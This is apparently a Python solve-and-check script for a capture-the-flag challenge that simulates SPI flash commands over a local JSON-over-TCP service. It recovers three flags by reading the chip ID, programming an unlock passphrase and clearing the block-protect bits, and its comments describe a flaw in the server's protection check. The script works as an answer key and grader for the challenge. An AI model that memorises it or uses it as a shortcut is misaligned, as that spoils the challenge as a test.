import json
import os
import socket

HOST = os.environ.get("SERVICE_SPIFLASH_SHELL_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_SPIFLASH_SHELL_PORT", "1337"))

# Adapted from the challenge's own checker/solve.py + source/client.py
# (author-provided). The service speaks a tiny JSON-over-TCP protocol
# that simulates raw SPI flash commands against an emulated chip:
#   0x9F read JEDEC ID        -> flag1 is embedded directly as the ID
#   0x06 write enable, 0x02 page program, 0x03 read data
#   0x01 write status register (clears the block-protect bits)
# flag2 is stored XOR-encrypted at sector 0x2000; the server only returns
# the decrypted bytes once the literal passphrase "UNLOCK" has been
# page-programmed into sector 0x1000. flag3 sits at sector 0x3000 behind
# the chip's block-protect bits in the status register -- except the
# server's own protection check only applies to addresses in the upper
# half of the 16MB flash, so 0x3000 is actually never protected in the
# first place; the status-register clear is harmless but not even
# load-bearing here.


def exchange(host, port, hex_list, readlen=0):
    command_data = {
        "tool": "pyftdi",
        "cs_pin": 0,
        "url": "ftdi://ftdi:2232h/1",
        "data_out": [hex(x) for x in hex_list],
        "readlen": readlen,
    }
    # The server handles exactly one request per TCP connection and closes
    # immediately afterward -- a fresh socket is required for every command.
    with socket.create_connection((host, port), timeout=15) as sock:
        sock.sendall(json.dumps(command_data).encode("utf-8"))
        data = b""
        while not data.endswith(b"]"):
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        return json.loads(data.decode("utf-8"))


def read_data(host, port, address, length):
    addr_high = (address >> 16) & 0xFF
    addr_mid = (address >> 8) & 0xFF
    addr_low = address & 0xFF
    return exchange(host, port, [0x03, addr_high, addr_mid, addr_low], length)


def page_program(host, port, address, data):
    exchange(host, port, [0x06], 0)
    addr_high = (address >> 16) & 0xFF
    addr_mid = (address >> 8) & 0xFF
    addr_low = address & 0xFF
    return exchange(host, port, [0x02, addr_high, addr_mid, addr_low] + data, 0)


def write_status_register(host, port, value):
    exchange(host, port, [0x06], 0)
    return exchange(host, port, [0x01, value], 0)


def bytes_to_string(byte_list):
    result = []
    for b in byte_list:
        if b == 0xFF or b == 0x00:
            break
        result.append(b)
    return bytes(result).decode("utf-8", errors="ignore")


jedec_id = exchange(HOST, PORT, [0x9F], 100)
flag1 = bytes_to_string(jedec_id)
print(f"flag1: {flag1}")

unlock_key = list(b"UNLOCK")
page_program(HOST, PORT, 0x1000, unlock_key)
flag2 = bytes_to_string(read_data(HOST, PORT, 0x2000, 64))
print(f"flag2: {flag2}")

write_status_register(HOST, PORT, 0x00)
flag3 = bytes_to_string(read_data(HOST, PORT, 0x3000, 64))
print(f"flag3: {flag3}")

for name, flag in (("flag_flag1", flag1), ("flag_flag2", flag2), ("flag_flag3", flag3)):
    expected = os.environ.get(name)
    if expected and expected not in flag:
        raise SystemExit(f"{name} mismatch: expected {expected!r} to be in {flag!r}")
